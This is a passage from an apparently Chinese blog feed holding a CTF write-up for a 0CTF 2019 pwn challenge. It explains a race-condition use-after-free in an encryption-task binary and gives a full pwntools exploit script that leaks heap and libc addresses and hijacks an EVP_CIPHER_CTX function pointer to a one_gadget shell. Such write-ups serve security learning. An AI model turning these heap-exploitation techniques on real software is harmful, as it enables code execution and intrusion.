class="built_in">size</span>创建）</span><br></pre></td></tr></table></figure></p><p>task_info结构体如下:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>chunk_info      struc ; (sizeof=<span class="number">0</span>x70, mappedto_7)</span><br><span class="line"><span class="symbol">00000000 </span>data_ptr        dq ?</span><br><span class="line"><span class="symbol">00000008 </span>size            dq ?</span><br><span class="line"><span class="symbol">00000010 </span>choice          dd ?</span><br><span class="line"><span class="symbol">00000014 </span><span class="keyword">Key</span>             db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="symbol">00000034 </span>IV              db <span class="number">16</span> dup(?)</span><br><span class="line"><span class="symbol">00000044 </span>unkonwn         db <span class="number">20</span> dup(?)</span><br><span class="line"><span class="symbol">00000058 </span>EVP_CIPHER_CTX_ptr dq ?</span><br><span class="line"><span class="symbol">00000060 </span>task_ID         dq ?</span><br><span class="line"><span class="symbol">00000068 </span>fd              dq ?</span><br><span class="line"><span class="symbol">00000070 </span>chunk_info      ends</span><br></pre></td></tr></table></figure></p><p>其中choice就是加密还是解密（1是加密，2是解密）.<br>这个结构体也是使用单向链表串起来的，插入方式是头插法. fd 指向上一个task<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;fd = link_head<span class="comment">;</span></span><br><span class="line"><span class="attribute">result</span> = s<span class="comment">;</span></span><br><span class="line">link_head = (__int64)s<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数:"></a>delete函数:</h5><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">void</span> <span class="type">Delete</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> task_id; // [rsp+<span class="type">Ch</span>] [rbp-<span class="number">14</span>h]</span><br><span class="line">  <span class="built_in">void</span> **<span class="keyword">ptr</span>; // [rsp+<span class="number">10</span>h] [rbp-<span class="number">10</span>h]</span><br><span class="line">  __int64 v2; // [rsp+<span class="number">18</span>h] [rbp-<span class="number">8</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">ptr</span> = (<span class="built_in">void</span> **)link_head;</span><br><span class="line">  v2 = link_head;</span><br><span class="line">  printf(<span class="string">"Task id : "</span>);</span><br><span class="line">  task_id = read_and_str2int();</span><br><span class="line">  <span class="keyword">if</span> ( link_head &amp;&amp; task_id == *(_DWORD *)(link_head + <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    link_head = *(_QWORD *)(link_head + <span class="number">104</span>);   // =fd</span><br><span class="line">    <span class="type">EVP_CIPHER_CTX_free</span>(<span class="keyword">ptr</span>[<span class="number">11</span>]);</span><br><span class="line">    free(*<span class="keyword">ptr</span>);                                 // data_chunk</span><br><span class="line">    free(<span class="keyword">ptr</span>);                                  // chunk_info</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="keyword">ptr</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( task_id == *((_DWORD *)<span class="keyword">ptr</span> + <span class="number">24</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(v2 + <span class="number">104</span>) = <span class="keyword">ptr</span>[<span class="number">13</span>];</span><br><span class="line">        <span class="type">EVP_CIPHER_CTX_free</span>(<span class="keyword">ptr</span>[<span class="number">11</span>]);</span><br><span class="line">        free(*<span class="keyword">ptr</span>);</span><br><span class="line">        free(<span class="keyword">ptr</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = (__int64)<span class="keyword">ptr</span>;</span><br><span class="line">      <span class="keyword">ptr</span> = (<span class="built_in">void</span> **)<span class="keyword">ptr</span>[<span class="number">13</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里free过后并没有将指针清为NULL，看似有UAF，其实没有，由于该结构体是用链表串起来的，free过后，就将该结构体从链表中除去，所以下次free的时候就找不到了。delete函数这里没有啥问题。</p><h5 id="go函数"><a href="#go函数" class="headerlink" title="go函数:"></a>go函数:</h5><p>根据用户输入的task_id，找到对应的task结构体，然后创建一个新的线程，来进行加解密:<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"Task id : "</span>);</span><br><span class="line">task_id = read_and_str2int();</span><br><span class="line"><span class="keyword">for</span> ( <span class="built_in">arg</span> = (chunk_info *)link_head; <span class="built_in">arg</span>; <span class="built_in">arg</span> = (chunk_info *)<span class="built_in">arg</span>-&gt;fd )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( task_id == LODWORD(<span class="built_in">arg</span>-&gt;task_ID) )</span><br><span class="line">  &#123;</span><br><span class="line">    pthread_create(&amp;newthread, <span class="number">0</span>LL, (void *(*)(void *))start_routine, <span class="built_in">arg</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>start_routine函数:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  v2 = (unsigned __int64)a1;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>LL;</span><br><span class="line">  v4 = <span class="number">0</span>LL;</span><br><span class="line">  puts(<span class="string">"Prepare..."</span>);</span><br><span class="line">  sleep(<span class="number">2</span>u);</span><br><span class="line">  memset(output_chunk, <span class="number">0</span>, <span class="number">0x1010</span>uLL);</span><br><span class="line">  if ( !(unsigned int)EVP_CipherUpdate(</span><br><span class="line">                        *(_QWORD *)(v2 + <span class="number">88</span>),   <span class="comment">// 对象</span></span><br><span class="line">                        output_chunk,</span><br><span class="line">                        &amp;v1,</span><br><span class="line">                        *(_QWORD *)v2,          <span class="comment">// data_ptr</span></span><br><span class="line">                        (unsigned int)*(_QWORD *)(v2 + <span class="number">8</span>)) )<span class="comment">// size</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  if ( !(unsigned int)EVP_CipherFinal_ex(*(_QWORD *)(v2 + <span class="number">88</span>), (char *)output_chunk + *((_QWORD *)&amp;v2 + <span class="number">1</span>), &amp;v1) )</span><br><span class="line">    pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">  *((_QWORD *)&amp;v2 + <span class="number">1</span>) += v1;</span><br><span class="line">  puts(<span class="string">"Ciphertext: "</span>);</span><br><span class="line">  sub_107B(stdout, (__int64)output_chunk, *((unsigned __int64 *)&amp;v2 + <span class="number">1</span>), <span class="number">0x10</span>uLL, <span class="number">1</span>uLL);</span><br><span class="line">  pthread_exit(<span class="number">0</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>该函数在调用加解密函数之前sleep了两秒，这里就存在条件竞争。可以调用go函数之后，delete掉正在进行加解密的task，这样就可以造成UAF。</p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路:"></a>利用思路:</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">go</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure><p>go(1)后delete掉1，那么task_1的task_info中的第一项数据就会被修改成task_0的task_info_chunk的地址：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># [<span class="number">0x80</span>] : task_1 -&gt; task_0</span><br></pre></td></tr></table></figure></p><p>注意task_info结构体的第一项是data_ptr,这样的话task_1进行加密的时候，就会把从task_0的task_info开始的空间当做 data来进行加密，就会造成leak。<br>但是delete掉task_1后，task_1生成的 EVP_CIPHER_CTX 和EVP_CIPHER_CTX生成的chunk都会被free掉，这样加密就会出错，我们需要delete掉task_1后,申请chunk，将task_1的EVP_CIPHER_CTX重新申请回来确保加密过程的顺利执行.<br>具体过程:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">3</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">4</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">go</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">3</span>)</span></span></span><br></pre></td></tr></table></figure></p><p>此时tcache的情况如下:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x80</span>]  :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br><span class="line">[<span class="number">0xb0</span>]  :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br><span class="line">[<span class="number">0x110</span>] :  <span class="number">3</span>-&gt;<span class="number">2</span>-&gt;<span class="number">1</span>-&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">add</span>(5,<span class="attribute">data_size</span>=0xa0)#申请到的data chunk size为0xb0,该task会申请两个 size为0xb0的chunk</span><br><span class="line"><span class="builtin-name">add</span>(6)</span><br></pre></td></tr></table></figure></p><p>此时tcache的情况如下:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span><span class="function"><span class="title">x80</span>]  : 1-&gt;</span> <span class="number">0</span> </span><br><span class="line">[<span class="number">0</span>xb0]  : <span class="number">0</span></span><br><span class="line">[<span class="number">0</span><span class="function"><span class="title">x110</span>] : 1-&gt;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>这样就把task_1的EVP_CIPHER_CTX重新申请回来了，新创建的EVP_CIPHER_CTX对象就会重新创建一个chunk，之前的task_1的EVP_CIPHER_CTX对象创建的chunk就不用再管他了。<br>这样还不会申请到task_1的task_info chunk,不会破坏掉data_ptr.</p><h4 id="劫持执行流"><a href="#劫持执行流" class="headerlink" title="劫持执行流:"></a>劫持执行流:</h4><p>根据wp得知 EVP_EncryptUpdate 会调用EVP_CIPHER_CTX对象创建的chunk中的函数指针</p><p>EVP_EncryptUpdate:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">12h</span>], <span class="number">10h</span></span><br><span class="line"><span class="keyword">jz</span>      short loc_1208E8</span><br><span class="line"><span class="keyword">movsxd</span>  <span class="built_in">rcx</span>, <span class="built_in">r8d</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">r12</span></span><br><span class="line"><span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">20h</span>]</span><br></pre></td></tr></table></figure><p>其中rax就是EVP_CIPHER_CTX对象创建的chunk的地址.然后会调用 rax+0x20处的函数，那么可以利用条件竞争造成的UAF修改此处为one_gadget，劫持执行流。<br>伪代码如下:<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v9 = *(<span class="name">_QWORD</span> *)a1;</span><br><span class="line">if ( *(<span class="name">_BYTE</span> *)(*(<span class="name">_QWORD</span> *)a1 + 18LL) &amp; 0x10 )</span><br><span class="line">&#123;</span><br><span class="line">  v10 = (*(<span class="name">__int64</span> (<span class="name">__fastcall</span> **)(<span class="name">signed</span> int *, __int64, char *, _QWORD))(<span class="name">v9</span> + <span class="number">32</span>))(<span class="name">a1</span>, a2, a4, a5)<span class="comment">;</span></span><br><span class="line">  if ( <span class="name">v10</span> &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = v10;</span><br><span class="line">    return 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本:"></a>利用脚本:</h4><p>参考的文章提供的wp没法打通，可能是环境问题，我在他的思路下重新写了exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding= utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">a=process(<span class="string">"./task"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./task"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">IV=<span class="string">'A'</span>*<span class="number">16</span></span><br><span class="line">KEY=<span class="string">'A'</span>*<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    set scheduler-locking on</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x00000000000141D)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000001521)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="comment">#add,delete</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(id,choice,size,data,key=KEY,iv=IV,is_go=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_go==<span class="keyword">False</span>:</span><br><span class="line">        menu(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a.sendline(<span class="string">"1"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line">    a.recvuntil(<span class="string">"Encrypt(1) / Decrypt(2): "</span>)</span><br><span class="line">    a.sendline(str(choice))</span><br><span class="line">    a.recvuntil(<span class="string">"Key : "</span>)</span><br><span class="line">    a.send(key)</span><br><span class="line">    a.recvuntil(<span class="string">"IV : "</span>)</span><br><span class="line">    a.send(IV)</span><br><span class="line">    a.recvuntil(<span class="string">"Data Size : "</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Data : "</span>)</span><br><span class="line">    a.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(id)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Task id : "</span>)</span><br><span class="line">    a.sendline(str(id))</span><br><span class="line"><span class="comment"># chunk_info 0x80 , EVP_CIPHER_CTX 0xb0, EVP_CIPHER_CTX建的chunk 0x110 , data_chunk size可控</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="number">0x100</span>,<span class="string">'A'</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="number">592</span>,<span class="string">'A'</span>*<span class="number">592</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'A'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">go(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#0xb0: 6-&gt;5-&gt;4</span></span><br><span class="line"><span class="comment">#unsorted bin(0x110): 6-&gt;5-&gt;4 </span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'A'</span>*<span class="number">0xa0</span>)<span class="comment">#得到 4的EVP_CIPHER_CTX建的chunk,顺面拿出两个0xb0的chunk, 0xb0: 4</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">'A'</span>*<span class="number">0xa0</span>)<span class="comment">#得到 4的EVP_CIPHER_CTX</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Ciphertext: \n"</span>)</span><br><span class="line"></span><br><span class="line">string=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">38</span>): </span><br><span class="line">    temp=a.recvline().split()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">        string+=chr(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">2</span>,len(string),string,is_go=<span class="keyword">True</span>)  <span class="comment">#解密</span></span><br><span class="line">go(<span class="number">10</span>)</span><br><span class="line">a.readuntil(<span class="string">'Ciphertext: \n'</span>)</span><br><span class="line"></span><br><span class="line">temp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    temp.append(a.recv(<span class="number">3</span>)[:<span class="number">2</span>])</span><br><span class="line">temp.reverse()</span><br><span class="line">heap_base=int(<span class="string">""</span>.join(temp),<span class="number">16</span>)<span class="number">-0x1920</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"11 01 00 00 00 00 00 00 \na0 "</span>)</span><br><span class="line">temp=[<span class="string">'a0'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    temp.append(a.recv(<span class="number">3</span>)[:<span class="number">2</span>])</span><br><span class="line">temp.reverse()</span><br><span class="line">libc_base=int(<span class="string">""</span>.join(temp),<span class="number">16</span>)<span class="number">-352</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">add(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x1</span>,<span class="string">'A'</span>,is_go=<span class="keyword">True</span>)<span class="comment">#0x555555758650</span></span><br><span class="line">add(<span class="number">21</span>,<span class="number">1</span>,<span class="number">0x1</span>,<span class="string">'A'</span>)</span><br><span class="line">go(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">delete(<span class="number">21</span>)</span><br><span class="line"><span class="comment">#0xb0:21-&gt;20</span></span><br><span class="line"></span><br><span class="line">dest_chunk=heap_base+<span class="number">0x1650</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x10a38c</span></span><br><span class="line">success(<span class="string">"one_gadget_addr ==&gt; 0x%x"</span>%one_gadget)</span><br><span class="line">payload=p64(dest_chunk)+<span class="string">'\x00'</span>*<span class="number">10</span>+<span class="string">'\x10'</span><span class="comment">#   test    byte ptr [rax+12h], 10h</span></span><br><span class="line">payload=payload.ljust(<span class="number">32</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload+=p64(one_gadget)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">24</span>,<span class="number">1</span>,<span class="number">0xa0</span>,payload)<span class="comment">#data_chunk = task_20的EVP_CIPHER_CTX chunk</span></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;跟着别人的wp复现了0CTF 2019中所谓的最简单的一道pwn题（真tm难，大佬们太强了），顺面学习了一波条件竞争的利用.&lt;/p&gt;
&lt;bl
      
    
    </summary>
    
    
      <category term="条件竞争" scheme="http://yoursite.com/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    
  </entry>
  
  <entry>
    <title>malloc_consolidate利用</title>
    <link href="http://yoursite.com/2019/05/12/%C2%96malloc-consolidate%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/05/12/malloc-consolidate利用/</id>
    <published>2019-05-12T02:32:03.000Z</published>
    <updated>2019-05-12T08:41:41.255Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>最近跟着别人的wp复现了hctf的heapstorm_zero，是一道关于malloc_consolidate的利用。</p><blockquote><p>参考了<a href="https://www.anquanke.com/post/id/176139#h2-1" title="从hctf,0ctf两道题目看malloc_consolidate ()" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139#h2-1</a></p></blockquote><p>自己亲自操作时，遇到了很多的坑，调试了很久才找清了原因，记录下踩到的坑。</p><h4 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h4><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h5><p>该函数从chunk_size最小的fastbin头开始，依次将fastbin中的chunk放入unsorted bin中，在放入unsorted bin的过程中会检查该chunk上下的chunk是否是inuse的，如果是free的则合并，一起放入unsorted bin中，合并的操作会触发unlink。<br>该函数中的一些操作可以帮助绕过unlink检查，安全客的这个wp并没有说到..可能是我太菜了..不知道..<br>先分析下关键源码:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 